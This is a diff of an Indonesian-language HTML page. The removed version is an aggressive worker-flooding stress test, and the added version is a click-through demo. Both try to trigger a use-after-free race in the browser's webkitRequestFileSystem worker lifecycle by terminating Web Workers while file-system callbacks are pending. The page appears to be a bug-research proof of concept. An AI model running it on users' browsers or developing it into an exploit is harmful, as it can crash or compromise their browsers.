@@ -1,161 +1,175 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>FileSystem UAF Aggressive Stress Test</title>
+    <title>Demonstrasi Bug webkitRequestFileSystem</title>
     <style>
-        body { font-family: 'Consolas', monospace; background: #000; color: #0f0; padding: 10px; }
-        #log { height: 60vh; overflow-y: scroll; border: 1px solid #333; background: #111; padding: 5px; font-size: 11px; }
-        .crit { color: #f0f; font-weight: bold; }
-        .err { color: #f00; }
-        .warn { color: #ff0; }
-        .info { color: #0ff; }
-        #overlay { position: fixed; top: 10px; right: 10px; background: #222; padding: 10px; border: 1px solid #f00; }
+        body { font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; line-height: 1.6; padding: 20px; background-color: #f0f2f5; }
+        #container { max-width: 800px; margin: auto; background: #ffffff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        h1, h2 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
+        button { padding: 10px 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 5px; margin-right: 10px; background-color: #007bff; color: white; transition: background-color 0.3s; }
+        button:hover { background-color: #0056b3; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        #log-container { margin-top: 20px; }
+        #log { border: 1px solid #ccc; background: #2b2b2b; color: #f0f0f0; padding: 10px; height: 300px; overflow-y: scroll; font-family: 'Courier New', Courier, monospace; font-size: 14px; border-radius: 5px; }
+        .flowchart { background: #e9ecef; padding: 15px; border-radius: 5px; margin-top: 20px; font-family: 'Courier New', Courier, monospace; border-left: 4px solid #17a2b8; }
     </style>
 </head>
 <body>
-    <h1>🔬 Aggressive Worker FileSystem UAF Stress Test</h1>
-    <p>Strategi: Flood IPC Queue → Immediate Double Destroy (Terminate + Remove)</p>
-    
-    <div id="overlay">
-        <div>Count: <span id="count">0</span></div>
-        <div>Callbacks: <span id="cbs">0</span></div>
-        <div>Status: <span id="status" class="warn">READY</span></div>
+
+<div id="container">
+    <h1>Demonstrasi Bug Lifecycle <code>webkitRequestFileSystem</code></h1>
+    <p>Script ini mendemonstrasikan potensi <em>race condition</em> (Use-After-Destroy) yang dijelaskan dalam flowchart Anda. Intinya, sebuah Worker dapat dihentikan setelah ia membuat permintaan asinkron ke FileSystem, tetapi sebelum callback dari permintaan itu kembali.</p>
+
+    <h2>Flowchart Anda</h2>
+    <div class="flowchart">
+        <pre>
+Worker JS call -> Blink C++ -> Security Checks -> Async Dispatch
+       |                                                |
+       '--- (Worker bisa dihentikan di sini) ---'       |
+       |                                                V
+Callback kembali ke context worker yang mungkin sudah hancur -> CRASH
+        </pre>
     </div>
 
-    <button onclick="startStress()">START STRESS</button>
-    <button onclick="stopStress()">STOP</button>
-    <button onclick="document.getElementById('log').innerHTML=''">CLEAR</button>
+    <h2>Coba Sendiri</h2>
+    <p>Ikuti langkah-langkah ini untuk mencoba memicu kondisi tersebut:</p>
+    <ol>
+        <li>Klik <b>"Mulai Worker"</b> untuk membuat worker baru.</li>
+        <li>Klik <b>"Minta FileSystem"</b>. Ini akan memberitahu worker untuk memanggil <code>webkitRequestFileSystem</code>.</li>
+        <li><b>SEGERA</b> setelah itu, klik <b>"Hentikan Worker"</b>.</li>
+    </ol>
+    <p>Jika Anda cukup cepat, Anda akan menghentikan worker di antara langkah 10 dan 12 dari flowchart. Di browser yang rentan, ini bisa menyebabkan tab atau browser crash karena callback mencoba berjalan pada context yang sudah tidak valid.</p>
 
-    <div id="log"></div>
+    <div>
+        <button id="start-worker">1. Mulai Worker</button>
+        <button id="request-fs" disabled>2. Minta FileSystem</button>
+        <button id="terminate-worker" disabled>3. Hentikan Worker (Klik Cepat!)</button>
+    </div>
 
-    <!-- WORKER SCRIPT -->
-    <script id="worker-src" type="javascript/worker">
-        // Non-standar API, harus dibungkus try-catch agar worker tidak langsung mati saat error
-        try {
-            if (self.webkitRequestFileSystem) {
-                self.onmessage = function(e) {
-                    // Loop internal worker untuk membanjiri antrean IPC
-                    // Kita kirim banyak request sekaligus sebelum worker sempat diproses terminasi
-                    for (let i = 0; i < 5; i++) {
-                        try {
-                            self.webkitRequestFileSystem(
-                                self.TEMPORARY, 
-                                1024 * 1024, // 1MB request (meminta alokasi)
-                                function(fs) {
-                                    // CRITICAL ZONE: Jika ini muncul setelah parent post 'DIE',
-                                    // berarti callback berjalan di context yang sedang/ sudah hancur.
-                                    self.postMessage({ type: 'GHOST_CALLBACK', name: fs.name });
-                                },
-                                function(err) { /* ignore */ }
-                            );
-                        } catch(e) {}
-                    }
-                };
-            } else {
-                self.postMessage({ type: 'LOG', msg: 'API NOT SUPPORTED', class: 'err' });
-            }
-        } catch(e) {
-            self.postMessage({ type: 'LOG', msg: 'INIT ERROR: ' + e.message, class: 'err' });
-        }
-    </script>
+    <div id="log-container">
+        <h2>Log Aktivitas</h2>
+        <div id="log"></div>
+    </div>
+</div>
 
-    <script>
-        let running = false;
-        let count = 0;
-        let cbs = 0;
-        let workerBlob = null;
-        let workerUrl = null;
+<script>
+// --- SCRIPT UNTUK HALAMAN UTAMA ---
 
-        const logDiv = document.getElementById('log');
-        const countEl = document.getElementById('count');
-        const cbsEl = document.getElementById('cbs');
-        const statusEl = document.getElementById('status');
+const startButton = document.getElementById('start-worker');
+const requestButton = document.getElementById('request-fs');
+const terminateButton = document.getElementById('terminate-worker');
+const logElement = document.getElementById('log');
 
-        function log(msg, cls = '') {
-            const d = document.createElement('div');
-            d.className = cls;
-            d.textContent = `> ${msg}`;
-            logDiv.appendChild(d);
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
+let worker = null;
 
-        function init() {
-            if (workerUrl) return;
-            const code = document.getElementById('worker-src').textContent;
-            workerBlob = new Blob([code], { type: 'application/javascript' });
-            workerUrl = URL.createObjectURL(workerBlob);
-            
-            // Cek ketersediaan API di main thread juga
-            if (!window.webkitRequestFileSystem) {
-                log("PERINGATAN: webkitRequestFileSystem tidak ditemukan di Main Thread.", "warn");
-                log("Browser modern mungkin memblokir API ini. Coba Chrome < 100 atau flag khusus.", "warn");
-            }
-        }
+function log(message) {
+    console.log(message);
+    logElement.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
+    logElement.scrollTop = logElement.scrollHeight;
+}
 
-        function startStress() {
-            if (running) return;
-            init();
-            running = true;
-            statusEl.textContent = "ATTACKING";
-            statusEl.className = "crit";
-            log("Memulai Stress Test...", "info");
-            stressLoop();
-        }
+// Konten untuk file worker.js dibuat sebagai string
+const workerScriptContent = `
+    // Polyfill untuk FileError jika tidak didefinisikan
+    if (typeof self.FileError === 'undefined') {
+        self.FileError = {
+            QUOTA_EXCEEDED_ERR: 10, NOT_FOUND_ERR: 1, SECURITY_ERR: 2,
+            INVALID_MODIFICATION_ERR: 9, INVALID_STATE_ERR: 7
+        };
+    }
 
-        function stopStress() {
-            running = false;
-            statusEl.textContent = "STOPPED";
-            statusEl.className = "err";
-            log("Dihentikan.", "warn");
-        }
+    self.onmessage = function(e) {
+        if (e.data === 'request-fs') {
+            postMessage('Menerima perintah, memanggil webkitRequestFileSystem...');
+            const size = 1024 * 1024; // 1MB
 
-        function stressLoop() {
-            if (!running) return;
-
-            // Batch attack: Buat 10 worker per frame untuk membebani scheduler
-            for (let i = 0; i < 10; i++) {
-                spawnKillerWorker();
-            }
-
-            count += 10;
-            countEl.textContent = count;
-            
-            // Gunakan requestAnimationFrame untuk sinkronisasi dengan refresh rate browser
-            // Ini sering menciptakan timing yang lebih "pas" untuk race condition daripada setTimeout
-            requestAnimationFrame(stressLoop);
-        }
-
-        function spawnKillerWorker() {
-            const w = new Worker(workerUrl);
-            
-            // Listener untuk mendeteksi "Ghost Callback"
-            w.onmessage = function(e) {
-                const d = e.data;
-                if (d.type === 'GHOST_CALLBACK') {
-                    cbs++;
-                    cbsEl.textContent = cbs;
-                    log(`⚠️ GHOST CALLBACK DETECTED! FS: ${d.name}`, "crit");
-                    // Ini adalah indikasi kuat bug lifecycle
-                } else if (d.type === 'LOG') {
-                    log(d.msg, d.class);
-                }
+            const onSuccess = function(fs) {
+                // Jika worker sudah mati, baris ini seharusnya tidak tereksekusi,
+                // tapi pemanggilan internal di C++ bisa menyebabkan UAF.
+                postMessage('SUKSES: FileSystem didapatkan! Nama: ' + fs.name);
             };
 
-            // 1. Kirim perintah kerja (Memasukkan task ke antrean IPC)
-            w.postMessage({ action: 'flood' });
+            const onError = function(err) {
+                let msg = 'ERROR: Gagal mendapatkan FileSystem. Kode error: ' + err.code;
+                postMessage(msg);
+            };
 
-            // 2. HANCURKAN SEGERA (Tanpa delay)
-            // Kita paksa thread worker berhenti seketika
-            w.terminate();
-            
-            // 3. Hapus referensi agar GC segera mengambil alih
-            // Ini penting untuk memastikan objek C++ terkait worker di-mark untuk deletion
-            // w = null; 
+            postMessage('Memanggil webkitRequestFileSystem(TEMPORARY, ' + size + ')');
+
+            // Langkah 10: Panggilan async dikirim. Worker sekarang rentan.
+            try {
+                self.webkitRequestFileSystem(self.TEMPORARY, size, onSuccess, onError);
+                postMessage('Panggilan async ke webkitRequestFileSystem telah dibuat.');
+            } catch (ex) {
+                postMessage('Error saat memanggil webkitRequestFileSystem: ' + ex.message);
+            }
         }
+    };
+`;
 
-        // Logging awal
-        log("Siap. Tekan START.", "info");
-    </script>
+// Membuat Worker dari Blob untuk menghindari kebutuhan file terpisah
+function createWorker() {
+    try {
+        const blob = new Blob([workerScriptContent], { type: 'application/javascript' });
+        return new Worker(URL.createObjectURL(blob));
+    } catch (e) {
+        log('Error membuat worker: ' + e.message);
+        return null;
+    }
+}
+
+startButton.addEventListener('click', () => {
+    log('Membuat worker...');
+    worker = createWorker();
+
+    if (worker) {
+        log('Worker berhasil dibuat.');
+
+        worker.onmessage = function(e) {
+            log('Pesan dari Worker: <span style="color:#87ceeb;">' + e.data + '</span>');
+        };
+
+        worker.onerror = function(e) {
+            log('Error di Worker: <span style="color:#ff6b6b;">' + e.message + '</span>');
+            e.preventDefault();
+        };
+        
+        startButton.disabled = true;
+        requestButton.disabled = false;
+        terminateButton.disabled = false;
+    }
+});
+
+requestButton.addEventListener('click', () => {
+    log('MAIN: Mengirim pesan ke worker untuk meminta FileSystem.');
+    worker.postMessage('request-fs');
+    log('MAIN: Pesan terkirim. <b style="color:#f9ca24;">Sekarang klik "Hentikan Worker" secepatnya!</b>');
+});
+
+terminateButton.addEventListener('click', () => {
+    if (worker) {
+        log('MAIN: Menghentikan worker...');
+        worker.terminate();
+        log('MAIN: <b style="color:#ff8c00;">Worker dihentikan.</b> Jika callback FileSystem kembali setelah ini, bisa terjadi crash.');
+        worker = null;
+        
+        requestButton.disabled = true;
+        terminateButton.disabled = true;
+        startButton.disabled = false;
+    }
+});
+
+// Cek apakah API didukung oleh browser saat halaman dimuat
+window.onload = function() {
+    if (!window.webkitRequestFileSystem && !window.requestFileSystem) {
+        log('<b style="color:#ff6b6b;">API webkitRequestFileSystem/requestFileSystem tidak didukung di browser ini. Demo tidak akan berfungsi.</b>');
+        startButton.disabled = true;
+    }
+};
+
+</script>
+
 </body>
 </html>
+
